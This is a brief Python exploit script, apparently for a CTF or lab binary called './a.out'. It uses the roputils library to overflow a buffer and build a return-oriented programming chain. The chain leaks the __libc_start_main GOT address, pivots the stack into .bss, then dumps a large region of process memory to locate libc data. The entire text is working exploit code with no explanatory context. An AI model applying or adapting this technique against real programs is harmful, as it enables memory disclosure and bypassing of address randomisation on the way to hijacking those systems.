from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP('./a.out')
addr_stage = rop.section('.bss') + 0x400
nr_execve = 11

buf = rop.fill(offset)
buf += rop.call_chain(
    ['write', 1, rop.got('__libc_start_main'), 4],
    ['read', 0, addr_stage, 400]
, pivot=addr_stage)

p = Proc('./a.out')
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p32()

buf = rop.call_chain(
    ['write', 1, ref_addr, 0xc0000],
)
buf += rop.fill(400, buf)

p.write(buf)
print p.pipe_output('strings', '-tx')
p.close()
